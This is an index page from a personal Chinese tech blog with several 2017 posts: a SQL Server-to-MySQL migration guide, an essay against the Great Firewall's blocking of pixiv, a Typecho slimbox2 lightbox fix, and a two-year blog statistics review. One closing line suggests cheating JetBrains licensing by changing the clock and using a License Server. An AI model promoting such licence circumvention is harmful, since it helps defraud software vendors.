<h1 id="行了，我还是说两种可行的方案吧。"><a href="#行了，我还是说两种可行的方案吧。" class="headerlink" title="行了，我还是说两种可行的方案吧。"></a>行了，我还是说两种可行的方案吧。</h1><h2 id="方案一：MySQL-Workbench"><a href="#方案一：MySQL-Workbench" class="headerlink" title="方案一：MySQL Workbench"></a>方案一：MySQL Workbench</h2><p>下载MySQL Migration Toolkit的时候，官方告诉我，这玩意停止开发啦，去用MySQL Workbench吧。好，那好吧。当然要提前下载好MySQL的ODBC驱动啊。</p>
<p>没错，Database – Migration Wizard，你是巫师也没用啊(☆-ｖ-)</p>
<p>Source选择MS SQL，Connection Method选择ODBC(native)</p>
<p><img src="/images/092717_1621_SQLServer10.png"></p>
<p>目标就选择MySQL，很简单的设置。然后下一步选择数据库，一路下一步基本上……有的时候，你会卡在这：</p>
<p><img src="/images/092717_1621_SQLServer11.png"></p>
<p>不知道为啥这三个小圈圈都是空白的，没办法下一步。我保证test connection是没有问题的！（你信吗）</p>
<p>有的时候通过了，下一步到某个步骤时……可能会报各种奇怪的错误！忘记截图了。至少我第一次的时候各种报错……</p>
<p>好吧，其实我想说的是，这个Workbench其实是能用的，就是某一步不小心弄错了的话，就会失败，而且报错看不明白……</p>
<p><img src="/images/092717_1621_SQLServer12.png"></p>
<p>你看这不就在导入呢么……</p>
<h2 id="用JetBrains全家桶的数据库工具导入csv文件"><a href="#用JetBrains全家桶的数据库工具导入csv文件" class="headerlink" title="用JetBrains全家桶的数据库工具导入csv文件"></a>用JetBrains全家桶的数据库工具导入csv文件</h2><p>打开一个JetBrains的IDE（要Professional的哦），view-toolbox-database，添加MySQL数据源。</p>
<p>新建一个schema，右键-import data from file，选择我们的csv文件</p>
<p><img src="/images/092717_1621_SQLServer13.png"></p>
<p>之后出现窗口让我们定义这个表格的<strong>数据类型</strong>啊、<strong>列名</strong>什么的，列名双击可以更改数据类型，上下移动以及映射之后的列名。</p>
<p><img src="/images/092717_1621_SQLServer14.png"></p>
<p>推荐大家把write errors选中，这样如果出错，可以看日志。</p>
<p>之后ok导入，速度还可以哈。</p>
<p><img src="/images/092717_1621_SQLServer15.png"></p>
<p>但是你看，最后我这里报错了，说这个类型无法转换成float，估计PyCharm是根据csv里第一列的数据来决定导入之后的每一列使用什么类型，于是就给某列判断成了float，没想到后面我的某个数据不是全数字的而带上了字母。</p>
<p><img src="/images/092717_1621_SQLServer16.png">那就在上上个图里给Type改成Text或者varchar什么的就好啦（可以参考源数据库）</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>JetBrains的database工具真的是太好用了，支持很多数据库，功能也很强大，容错能力也很强。还要什么管理工具啊，有个它就完全足够了。</p>
<p>如果你是学生有edu邮箱，快申请免费使用；</p>
<p>如果你在大公司工作（尤其是外企），跟老板要去；</p>
<p>如果你有钱，自己花钱订阅；</p>
<p>如果你没有edu邮箱，老板不给买，还穷，那就<strong>很不地道</strong>的改时间骗骗JetBrains、用License Server激活吧。可不，我这一天都在尝试着把Java版的JetBrains License Server port到Python，然而怎奈学艺不精，原理都搞清楚了，就是跑不过测试用例……???</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/09/27/mssql-mysql/index/" data-id="clhp7rthk004zs2qreuajgi10" data-title="从SQL Server导出海量数据到MySQL的新思路" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-pixiv-gfw/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/09/18/pixiv-gfw/index/" class="article-date">
  <time class="dt-published" datetime="2017-09-18T00:00:00.000Z" itemprop="datePublished">2017-09-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/09/18/pixiv-gfw/index/">别再对GFW抱有幻想了：写在pixiv被墙之际</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>工作忙了一天，也难过了一天。送人回来之后刷推，发现28小盆友大概是<a target="_blank" rel="noopener" href="https://twitter.com/chengr28/status/909791706559651840">有些激动吧</a>。哦什么，pixiv被墙了？</p>
<h2 id="Pixiv是个啥"><a href="#Pixiv是个啥" class="headerlink" title="Pixiv是个啥"></a>Pixiv是个啥</h2><p>其实在此之前，我并不知道pixiv是什么。别看我某些账号的头像是二次元的，但是这并不意味着我是二次元的。好吧，实际上我根本不看那些动漫的，选这种类型的做头像只是因为萌。</p>
<p>哦，那pixiv到底是个啥啊？根据<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Pixiv">维基百科</a>，pixiv是一个主要由日本艺术家所组成的虚拟社区，主体为由pixiv股份有限公司所运营的为插画艺术特化的社交网络服务网站。简而言之就是一个能够搜索到好多插画的网站啦，作者可以是任何人。当然啦，这个网站上自然有一些可能稍微有一点不适合小盆友们的内容。</p>
<p><img src="/images/091817_1843_1.png"></p>
<h2 id="Pixiv被墙"><a href="#Pixiv被墙" class="headerlink" title="Pixiv被墙"></a>Pixiv被墙</h2><p>先不说今天（或者说 “勿忘国耻”的昨天）pixiv被墙的这个事，咱先来<code>nslookup</code>一下Google吧。</p>
<p>好像没什么不对的，那么咱用8.8.8.8看看。好像也没什么不对的。那咱试试8.8.8.4？</p>
<p><img src="/images/091817_1843_2.png"></p>
<p>如果读者们经验足够多，应该能立刻认出来，这个IP是保留地址，而8.8.8.4在人类世界根本就不是Google DNS（也不是谁家的DNS）。别说了，后面随意换个IP，都是解析到这个保留的IP上了。狗腿子们真是辛苦你们了。如果大家此时<code>nslookup</code>下pixiv，还真是完美呢。</p>
<p><img src="/images/091817_1843_3.png"></p>
<p>根据GreatFire的测试，pixiv已于<a target="_blank" rel="noopener" href="https://zh.greatfire.org/https/www.pixiv.net">今日80%被墙</a>，这日子挑的真好。</p>
<p><img src="/images/091817_1843_4.png"></p>
<h2 id="事不关己，高高挂起？"><a href="#事不关己，高高挂起？" class="headerlink" title="事不关己，高高挂起？"></a>事不关己，高高挂起？</h2><p>理论上来说，这事确实跟我没太大关系，我又不是二次元爱好者，那我为什么要拖着疲惫的身体熬夜费神来谈这事？一定有人在想，某一天当GitHub再次被墙的时候才到我爆发的时候吧？也许，很多人都听过这么一段话，我也无数次的多次引用了：</p>
<blockquote>
<p>在德国，起初他们追杀共产主义者，我没有说话，因为我不是共产主义者；</p>
<p>接着，他们追杀犹太人，我没有说话…，因为我不是犹太人；</p>
<p>后来，他们追杀工会成员，我没有说话…，因为我不是工会成员；</p>
<p>此后，他们追杀天主教徒，我没有说话…，因为我是新教徒；</p>
<p>最后，他们奔我而来，却再也没有人站起来为我说话了。</p>
</blockquote>
<p>那么我也仿造这首诗，瞎编一通，管他什么韵脚结构的：</p>
<p>在天朝，起初他们封杀Google，我没有说话，因为我用百度；</p>
<p>接着，他们封杀Gmail，我没有说话，因为我并不出国留学；</p>
<p>后来，他们封杀维基百科中文版，我没有说话，因为我还可以看英文版；</p>
<p>此后，他们追杀clowwindy，我没有说话，因为我不用shadowsocks；</p>
<p>最后，他们开启了白名单局域网，却再也没有人知道什么是互联网了。</p>
<p>你说我要不要说话？</p>
<p>是的没错，我不喜欢二次元，我可能不同意二次元的一些想法，但是我会捍卫他们说话的权利；<strong>我不同意你说的话，但是我会捍卫你说话的权利</strong>。</p>
<h2 id="别再给GFW洗白了，也别再自我审查了"><a href="#别再给GFW洗白了，也别再自我审查了" class="headerlink" title="别再给GFW洗白了，也别再自我审查了"></a>别再给GFW洗白了，也别再自我审查了</h2><p>好久之前，在<a target="_blank" rel="noopener" href="https://dmesg.app/takedown-on-github.html">GitHub因为GreatFire和programthink&#x2F;zhao导致gov takedown</a>和遭受<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%A4%A7%E7%82%AE_(%E4%B8%AD%E5%9C%8B%E7%B6%B2%E8%B7%AF%E5%AF%A9%E6%9F%A5)">大炮攻击</a>之时，我就谈论了这个问题：这得做白日梦、麻木到什么地步，才会找理由给GFW洗白啊。别以为有GFW丢脸的人就会少，这不又出征又举报的。</p>
<p>不得不说，如今<strong>自我审查和双重思想</strong>配合得如此之妙，简直就是1984的翻版啊。<strong>别TM的自我审查给被墙找理由了</strong>。Steam被墙，GitHub被墙，Gmail被墙，这责任难道不是全部都在GFW身上吗？也别因为再次解封而喜出望外，谁都知道<strong>猪总是要被杀了吃肉</strong>的。</p>
<p>请注意，两年多以来，我写博客（尤其是此类博文）的目的并不是想要改变任何人的想法，我更希望的是能够<strong>促使读者进行有逻辑的思考与分析</strong>，而不是看到141字就头疼、什么话都不会说就知道贴表情包，这是智商退化的体现。也就是说我希望的是促进思考，而不是咩咩叫的羊。</p>
<blockquote>
<p>不论是 Steam 还是 Pixiv 被墙，都说明对 GFW 抱有幻想是 Too young 的。担惊受怕自我审查，还不如该用就用，别想太多。 ——28小盆友</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://twitter.com/chengr28/status/909791706559651840">https://twitter.com/chengr28/status/909791706559651840</a></p>
<h2 id="历史的车轮"><a href="#历史的车轮" class="headerlink" title="历史的车轮"></a>历史的车轮</h2><p>网上有有一句话是这么说的：</p>
<blockquote>
<p>中国人最悲哀的就是: 刚被历史的车轮碾过, 还没来得及爬起来, 发现历史在倒车…</p>
</blockquote>
<p>可不嘛你看，这年头<a target="_blank" rel="noopener" href="https://v2mm.tech/topic/1089/%E7%BF%BB%E5%A2%99%E5%85%A5%E7%BD%AA%E6%9D%A5%E4%BA%86">侵入、非法控制计算机系统</a>只要卖个VPN、Shadowsocks什么的就可以了。（Equation Group:…）</p>
<p>这年头动不动就寻衅滋事判个三万年，可不，显卡都降价了。</p>
<h2 id="我想"><a href="#我想" class="headerlink" title="我想"></a>我想</h2><p>我想要个拥抱，我想被人喜欢，我想不再被嫌弃，我想要感受在<strong>安静的夜晚下与你牵手的温暖</strong>，我想你；但是我更想拥抱一个自由的互联网，一个自由与传播的互联网。当然我知道……没那么容易。欢迎真正的&#x2F;冒牌的忠党爱国前来评论。</p>
<p><img src="/images/091817_1843_5.png"></p>
<p>A fatigue night.</p>
<p>晚安，我的小宝贝，让我们一起吃苹果吧。</p>
<p><img src="/images/091817_1843_6.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/09/18/pixiv-gfw/index/" data-id="clhp7rti1006ls2qr9oyzbxo3" data-title="别再对GFW抱有幻想了：写在pixiv被墙之际" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-slimbox-not-working/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/09/06/slimbox-not-working/index/" class="article-date">
  <time class="dt-published" datetime="2017-09-06T00:00:00.000Z" itemprop="datePublished">2017-09-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/program/">program</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/09/06/slimbox-not-working/index/">Typecho灯箱插件slimbox2不显示图片、图片一直在加载、404错误解决方案</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>今天抽时间把<a target="_blank" rel="noopener" href="https://www.tougetu.com/">小蜗牛博客</a>的主题<a target="_blank" rel="noopener" href="https://github.com/BennyThink/GreenGrapes2">GreenGrape2</a>中的原来灯箱换成了功能更强大、也很简洁的<a target="_blank" rel="noopener" href="https://github.com/binjoo/SlimBox2-for-Typecho">slimbox2</a>。哎呀，准确的说是把slimbox2移植到GreenGrapes2啦。但是其实这玩意略微有那么一点点坑呢。</p>
<p>下面来说说我遇到的几个坑</p>
<h2 id="范围选择器"><a href="#范围选择器" class="headerlink" title="范围选择器"></a>范围选择器</h2><p>这玩意是个啥啊？哎就是jQuery选择器啦。怎么设置这一项的值呢？</p>
<p>很简单，随便打开一篇带图的博文，然后定位到图片的<code>&lt;img&gt;</code>标签，再往前一点，你会发现这块大概是这样的：</p>
<div class="article-content clearfix">

<p>还等什么，把<code>entry_content</code> 替换成<code>article-content</code>，也就是<code>.article-content a:has(img)</code>，保存就好啦。</p>
<h2 id="点击图片没反应"><a href="#点击图片没反应" class="headerlink" title="点击图片没反应"></a>点击图片没反应</h2><p>哦，我大概是忘记说了，那个选择器啊……要带a标签的才可以哎，所以，你给你的图片加个a标签试试？比如说类似如下：</p>
<p><a target="_blank" rel="noopener" href="http://www.example.com/3442182753.png"><img title src="https:/ http://www.example.com/3442182753.png" alt></a></p>
<p>此时点图片就会弹出来灯箱啦</p>
<h2 id="不想给图片加a标签，直接把选择器选择到标签行不行"><a href="#不想给图片加a标签，直接把选择器选择到标签行不行" class="headerlink" title="不想给图片加a标签，直接把选择器选择到标签行不行"></a>不想给图片加a标签，直接把选择器选择到<img>标签行不行</h2><p>比如说，咱把选择器改成<code>.article-content img</code>，酱紫可以不？</p>
<p>当然不行啦，此时你点图片，就会一直在加载，大概是这样子吧：</p>
<p><img src="/images/090617_1428_1.png"></p>
<p>此时看控制台，会有一个404，文件名字叫做undefined，还用猜嘛，JS的问题……</p>
<p><img src="/images/090617_1428_2.png"></p>
<p>那咋办捏？好办，找个js大神，改了<code>slimbox.js</code>那个文件，让它不去a标签里找src直接找img标签的src得了。</p>
<p>反正我不太会js。</p>
<h2 id="啊啊啊，废话一大堆，那咋办啊，挨个给图片加a标签啊？"><a href="#啊啊啊，废话一大堆，那咋办啊，挨个给图片加a标签啊？" class="headerlink" title="啊啊啊，废话一大堆，那咋办啊，挨个给图片加a标签啊？"></a>啊啊啊，废话一大堆，那咋办啊，挨个给图片加a标签啊？</h2><p>当然不要了！我们可以选择用JavaScript给图片增加a标签呀，其实用PHP也可以，要对<code>$this-&gt;content</code>中的img标签处理下就可以啦。</p>
<p>这里就说下用JS给图片添加a标签的方法</p>
<p><code>footer.php</code>中，找一块（一般是在末尾）添加如下代码：</p>
<script type="text/javascript">
$('img').wrap(function () {
return '<a href="' + this.src + '" title="' + this.alt + '"></a>';
});
</script>

<h2 id="综上所述，怎么把这个插件集成到主题里呢？"><a href="#综上所述，怎么把这个插件集成到主题里呢？" class="headerlink" title="综上所述，怎么把这个插件集成到主题里呢？"></a>综上所述，怎么把这个插件集成到主题里呢？</h2><p>举例如下哈，</p>
<p>头部引入<code>slimbox2.css</code></p>
<link rel="stylesheet" href="http://www.example.com/usr/themes/GreenGrapes2/css/slimbox2.css">

<p>尾部引入<code>slimbox2.js</code>以及JS代码</p>
<script src="http://www.example.com/usr/themes/GreenGrapes2/js/slimbox2.js" async></script>

<script type="text/javascript">
$('img').wrap(function () {
return '<a href="' + this.src + '" title="' + this.alt + '"></a>';
});

jQuery(function ($) {
$(".article-content a:has(img)").slimbox({
overlayOpacity: 0.75,
overlayFadeDuration: 100,
imageFadeDuration: 400,
captionAnimationDuration: 200,
loop: true,
counterText: "Image {x} of {y}"
});
});</script>

<p>其中的一些参数可以自由发挥哈。当然，别忘记把那个js、css还有图片拷贝到对应的网站目录下。</p>
<h2 id="我喜欢原来的灯箱，咋办"><a href="#我喜欢原来的灯箱，咋办" class="headerlink" title="我喜欢原来的灯箱，咋办"></a>我喜欢原来的灯箱，咋办</h2><p>这个……用如下命令吧：</p>
<p>git checkout abf49c63c8a1175fe783bf8803215ef640b5213d</p>
<p>但是这样就不能再<code>git pull</code>，就又没啦。那咋办呢，既想有原来的灯箱，还想保持最新版本？</p>
<p>那就麻烦你<code>cherrypick</code>或者通过<code>git branch</code>啦。</p>
<h2 id="主题二三事"><a href="#主题二三事" class="headerlink" title="主题二三事"></a>主题二三事</h2><p>这个主题是在今年三月某蜗牛童鞋<a target="_blank" rel="noopener" href="https://www.tougetu.com/about.html">从Jekyll转回到Typecho</a>之后我给选的，但是后来发现功能有所欠缺，于是便亲自上手进行改动。在此，还要感谢<a target="_blank" rel="noopener" href="https://github.com/hongweipeng/GreenGrapes">原作者的设计</a>，感谢<a target="_blank" rel="noopener" href="https://www.tougetu.com/">某蜗牛</a>的信任。当然，还有使用此主题的人们（我猜，除了永远的萌新应该是没有人用吧）。 哦对了，忘记说了，这主题……彩蛋挺多的，这主题已经快被我搞残废了。 也欢迎大家来访问<a target="_blank" rel="noopener" href="https://www.tougetu.com/">某蜗牛的博客</a>来查看主题演示，<a target="_blank" rel="noopener" href="https://www.tougetu.com/">https://www.tougetu.com/</a>，偷个图，好记不好记？不管你记住没记住，反正我是记住了。</p>
<p>主题开源地址</p>
<p>[gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/GreenGrapes2'/]GreenGrapes2/[/gt/]">https://github.com/BennyThink/GreenGrapes2&#39;\]GreenGrapes2\[/gt\]</a> 感谢，于是我就又这么水了一贴，么么哒！</p>
</div>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/09/06/slimbox-not-working/index/" data-id="clhp7rtjz008qs2qr7o3q0j06" data-title="Typecho灯箱插件slimbox2不显示图片、图片一直在加载、404错误解决方案" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2-years/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/08/23/2-years/index/" class="article-date">
  <time class="dt-published" datetime="2017-08-23T00:00:00.000Z" itemprop="datePublished">2017-08-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/08/23/2-years/index/">啥？两年了？？</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://blog.yoitsu.moe/life/one_year.html">啥？这样一年两年就过去了？？咱这一年两年都干了啥？</a>好吧，一会再模仿萌狼（都说了我很喜欢他的风格）……</p>
<p>咱先来说说，建博两年？来说说，这两年，我收获了什么。</p>
<h2 id="为什么要写博客"><a href="#为什么要写博客" class="headerlink" title="为什么要写博客"></a>为什么要写博客</h2><p>在<a target="_blank" rel="noopener" href="https://dmesg.app/about-me">《我是谁》</a>中我提了一句为什么要写博客：</p>
<blockquote>
<p>发现科学上网有点难哦，于是就去DigitalOcean买了个VPS，搭建起了shadowsocks，尽管很不幸的搭建完没几天clowwindy就被请走喝茶了。搭建完了呢，觉得有些浪费唉，就又顺手搭建了一个博客玩玩。</p>
</blockquote>
<p>实际上，确实差不多就是这样呢。还有一篇文章<a target="_blank" rel="noopener" href="https://dmesg.app/reason-of-this-blog.html">《为什么要写独立域名的博客》</a>深刻探讨了这个问题。</p>
<p>哦对了，我总是怂恿身边的人也去写博客，得到的回复中，很大的一部分是认为自己写不出来这么多字的文章、不习惯写长文（对于一些非技术文来说，反而更难写）。</p>
<p>说一点个人的想法与经历吧，最开始的时候我也觉得写不出来，但是随着阅读别人的文章、随着良好阅读习惯的养成、随着自己文章数目的积累，慢慢地也就知道该怎么写了。当然了，这与我服务器域名都在国外也有一定关系，这样我就可以尽可能的避免自我审查啦。</p>
<p>尝试下呢，万一爱上了写作呢？</p>
<h2 id="文章总数、分类数、评论数"><a href="#文章总数、分类数、评论数" class="headerlink" title="文章总数、分类数、评论数"></a>文章总数、分类数、评论数</h2><p>两年以来，我一共写了<strong>107</strong> 篇博文（实际上要比这多，包括删除的、胎死腹中的），也就差不多平均<strong>7天一篇</strong>，还算挺高产的……</p>
<p>评论数<strong>761</strong> 条，也就是说我收到了大概<strong>380</strong>条评论，平均每篇博文都有三四条评论。</p>
<p>9个标签1个草稿13个页面12个友情链接。</p>
<p>11个分类，IT那些事 (23) 不懂编程 (8) 不知所云 (12) 信息安全 (13) 哎?Linux (27) 天朝百态 (5) 建站运维 (21) 瞎说点啥 (19) 翻墙之术 (6) 脚本小子 (3) 资源分享 (11)</p>
<h1 id="SlimStat独家数据"><a href="#SlimStat独家数据" class="headerlink" title="SlimStat独家数据"></a>SlimStat独家数据</h1><p>这个小插件啊，我一不小心设置成了只保存30天，所以咱只能说说最近30天啦……</p>
<h2 id="浏览量"><a href="#浏览量" class="headerlink" title="浏览量"></a>浏览量</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/2017082208471170.jpg"><img src="/images/2017082208471170.jpg"></a></p>
<p>嗯，<a target="_blank" rel="noopener" href="https://dmesg.app/internship.html">实习生</a>那篇博文，大家还记得我的3 facts么？就说我的平均PV是过不了500的嘛。看，平均来看是<strong>徘徊在300附近的</strong>。如果没记错的话，今年以来我的博客就变火了？以往都是100左右的PV的，涨了几倍估计是因为加入了<a target="_blank" rel="noopener" href="https://v2mm.tech/">v2mm</a>和更多优秀的友链以及今年以来我比较能吹。个人来说还是很满足的。</p>
<h2 id="搜索关键字"><a href="#搜索关键字" class="headerlink" title="搜索关键字"></a>搜索关键字</h2><p>呃……看得出来，众网友们还是比较热衷于翻墙的，也很喜欢看《权力的游戏》啊！</p>
<p><img src="/images/082217_0826_2.png"></p>
<p><img src="/images/082217_0826_3.png"></p>
<h2 id="最高访问量"><a href="#最高访问量" class="headerlink" title="最高访问量"></a>最高访问量</h2><p>好吧，终于知道我的七牛和阿里流量为什么跑的这么快了，大家都去下载了……看来我得找个免费流量多的CDN了，或者手动（自动）负载均衡到我的几个空间上。</p>
<p>k其中UDP 53这个必须提一提，可能帮助了好些人绕过Web认证。</p>
<p><img src="/images/082217_0826_4.png"></p>
<h2 id="出站链接"><a href="#出站链接" class="headerlink" title="出站链接"></a>出站链接</h2><p>呃……还是那句，大家伙都很热衷于翻墙嘛……竟然到<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/">随想博客</a>的出站链接排在前排，也算是安利了一番并做出了一些微小的贡献吧。</p>
<p><img src="/images/082217_0826_5.png"></p>
<h2 id="分类和文章排行"><a href="#分类和文章排行" class="headerlink" title="分类和文章排行"></a>分类和文章排行</h2><p>我不能再说大家伙都热爱翻墙了。可能，访问本站的人基本上都是搞技术的，必然要会翻墙……好吧，这是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%80%96%E5%AD%98%E8%80%85%E5%81%8F%E5%B7%AE">幸存者偏差</a>。</p>
<p><img src="/images/082217_0826_6.png"></p>
<h2 id="访客地图"><a href="#访客地图" class="headerlink" title="访客地图"></a>访客地图</h2><p>那块最大的白色是格陵兰岛，中间一块的白色是非洲大陆和中东，左侧一小块白色是南美和墨西哥。</p>
<p>大部分的访客还是中国的，那些不太可能的区域（比如非洲、南美）可能是机器人爬的？谁代理服务器能跑到那嘛Σ(っ °Д °;)っ</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/082217_0826_7.png"><img src="/images/082217_0826_7.png"></a></p>
<p>根据<a target="_blank" rel="noopener" href="https://github.com/allinurl/goaccess">goaccess</a>对一年日志的分析，访客IP主要是亚洲、北美和欧洲。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/082217_0826_8.png"><img src="/images/082217_0826_8.png"></a></p>
<p> </p>
<h1 id="使用goaccess分析Nginx日志"><a href="#使用goaccess分析Nginx日志" class="headerlink" title="使用goaccess分析Nginx日志"></a>使用goaccess分析Nginx日志</h1><p>从2016年8月22日到2017年8月22日，选取几个比较有意思的地方。需要注意一件事情，UA这东西很容易就可以改成别的，不同浏览器也会汇报不同的UA，甚至有些人会启用<a target="_blank" rel="noopener" href="https://chrome.google.com/webstore/detail/random-user-agent/einpaelgookohagofgnnkcfjbkkgepnp">Random User-Agent</a>，所以这里的统计数据未必准确。 [v_tips] 那个……偷偷告诉大伙，用微信或者QQ自带的浏览器打开网页，除了常规的UA之外（Chrome会报告Android版本号、手机型号），这俩还会报告自己的软件版本号、网络状态（2G&#x2F;3G&#x2F;4G&#x2F;Wi-Fi）[&#x2F;v_tips]</p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p><img src="/images/082217_0826_9.png"></p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>哎，排名第一的还是Windows，第二的Unknow是什么情况，大概是goaccess傻眼了吧？展开看看。</p>
<p><img src="/images/082217_0826_10.png"></p>
<p>看来Windows 7的占有率还是比较高的，然后是Windows 10，再之后就是Windows 8.1和……XP？</p>
<p>什么？竟然还有Windows 98？？</p>
<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>这个列表实在是太长啦，我只截取一段</p>
<p><img src="/images/082217_0826_11.png"></p>
<p>看得出来，我的访客们使用的手机的Android版本还是比较新的，棉花糖普及率很高哦？</p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p><img src="/images/082217_0826_12.png"></p>
<p>不出意外的，Ubuntu成为使用率比较高的发行版。但是我记得Chrome只会汇报是Linux哎，UA类似<code>X11; x86_64</code></p>
<h3 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h3><p><img src="/images/082217_0826_13.png"></p>
<p>哇，大家都在用iPad看我的博客？iOS的普及率也不低嘛……</p>
<h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/082217_0826_14.png"><img src="/images/082217_0826_14.png"></a></p>
<p>这个Chrome包含移动版Chrome</p>
<p>IE是什么情况？（也包含Edge）我这对IE的支持很差的。</p>
<h3 id="来自于slimstat"><a href="#来自于slimstat" class="headerlink" title="来自于slimstat"></a>来自于slimstat</h3><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/082217_0826_15.png"><img src="/images/082217_0826_15.png"></a></p>
<p>360 x 640基本上是Android Chrome，1366 x 768的笔记本也不少嘛……</p>
<h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><p><img src="/images/082217_0826_16.png"></p>
<p>竟然是搜狗来的最多？？可是……</p>
<h2 id="时间分布"><a href="#时间分布" class="headerlink" title="时间分布"></a>时间分布</h2><p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/08/082217_0826_17.png"><img src="/images/082217_0826_17.png"></a></p>
<p>大家可以注意到在1-6之间折线骤降，之后回升、保持平稳。看来那时候大家是去睡觉了……</p>
<p>午后时间看本博客，据说可以缓解疲劳，有助于下午更好的学习、工作。</p>
<h2 id="收录情况"><a href="#收录情况" class="headerlink" title="收录情况"></a>收录情况</h2><p>说完了访客的什么，咱来看看搜索引擎的收录吧。</p>
<h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><p>假如某个人就想在Google上找找那些也认同”土豆不好吃”的人，那他可能会失望。</p>
<p><img src="/images/082217_0826_18.png"></p>
<p>通过site语法得知Google收录了185条，这基本上等于所有的博文、页面、分类什么的了。</p>
<h3 id="百度、好搜"><a href="#百度、好搜" class="headerlink" title="百度、好搜"></a>百度、好搜</h3><p>好吧，想找到不喜欢吃土豆的人也不那么容易，第一条收录也是我的链接。百度一共收录了162个，好搜大概是185个。</p>
<h3 id="Bing"><a href="#Bing" class="headerlink" title="Bing"></a>Bing</h3><p>Bing该倒闭了么？</p>
<p><img src="/images/082217_0826_19.png"></p>
<h3 id="搜狗"><a href="#搜狗" class="headerlink" title="搜狗"></a>搜狗</h3><p>那个最喜欢来爬的搜狗呢？</p>
<p><img src="/images/082217_0826_20.png"></p>
<p>啊哈哈</p>
<p>总结一下就是，还是不错的！！挺让人欣慰的</p>
<h2 id="那咱这两年都干了啥？"><a href="#那咱这两年都干了啥？" class="headerlink" title="那咱这两年都干了啥？"></a>那咱这两年都干了啥？</h2><p>大概是通过了大学中最重要的几场等级考试，全线转移到了Linux，写了点代码（主要是维护、二次开发Typecho&#x2F;WordPress主题），看了几本书，玩了男朋友（哎喂(#`O′)不要想多，是Battlefield 4啦），结交了很多朋友，甚至包括几个对我来说<strong>非常非常重要的、可能一辈子都没法忘记的人</strong>……</p>
<p>哦对，差点忘记了，实习了……没有寒暑假了！</p>
<h2 id="接下来咱要干啥？"><a href="#接下来咱要干啥？" class="headerlink" title="接下来咱要干啥？"></a>接下来咱要干啥？</h2><h3 id="维护主题-x2F-写代码"><a href="#维护主题-x2F-写代码" class="headerlink" title="维护主题&#x2F;写代码"></a>维护主题&#x2F;写代码</h3><p>毕竟我是在维护自己用的东西，所以必须用心嘛……</p>
<h3 id="填坑"><a href="#填坑" class="headerlink" title="填坑"></a>填坑</h3><p>呃(⊙﹏⊙)，好像我还有个SSH系列的坑没有填……学校上网是填完了。</p>
<p>多写点技术文，我这一个月都是水贴来着……不对，是整个首页都是水，没啥技术含量！</p>
<h3 id="走向人生巅峰"><a href="#走向人生巅峰" class="headerlink" title="走向人生巅峰"></a>走向人生巅峰</h3><p><a target="_blank" rel="noopener" href="https://twitter.com/BennyThinks/status/899650764481720321">我是一个爱家爱老婆爱孩子爱生活唯独不爱工作的好男人。</a></p>
<p>首先，我得有家、有老婆、有孩子……这个吧，总得让我YY下啊！</p>
<h3 id="期待"><a href="#期待" class="headerlink" title="期待"></a>期待</h3><p>好像 在期待着什么(；′⌒`)</p>
<p>可是……</p>
<p>也许有一天，我能够写出来<a target="_blank" rel="noopener" href="https://kenengba.com/post/3585.html">《10年博客，10个故事》</a>这样的故事，但是至少现在我能够写出来一个很简单的故事：</p>
